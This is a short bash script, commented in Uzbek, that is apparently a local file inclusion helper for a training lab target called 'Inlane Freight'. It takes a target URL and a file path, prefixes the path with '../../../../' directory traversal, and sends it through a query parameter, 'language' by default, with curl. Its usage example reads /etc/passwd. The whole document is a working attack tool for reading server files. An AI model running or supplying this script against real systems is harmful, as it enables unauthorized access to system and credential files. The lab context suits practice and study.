#!/usr/bin/env bash
# LFI helper — 154.57.164.76:31038 (Inlane Freight lab)
# Foydalanish: ./lfi.sh [--param language] <target-url> <fayl>
# Misol:       ./lfi.sh http://154.57.164.76:31038/index.php /etc/passwd
set -uo pipefail

PARAM="language"
if [ "${1:-}" = "--param" ]; then
  PARAM="$2"; shift 2
fi

if [ "$#" -lt 2 ]; then
  echo "Foydalanish: $0 [--param <nom>] <url> <fayl-yo'li>" >&2
  exit 1
fi

URL="$1"
FILE="$2"                       # masalan: /etc/passwd
TRAV="../../../../${FILE#/}"    # app parametr oldiga papka qo'shadi -> yuqoriga chiqamiz

echo "[*] So'rov: ${URL}?${PARAM}=${TRAV}" >&2
curl -s --max-time 20 -G --data-urlencode "${PARAM}=${TRAV}" "$URL"
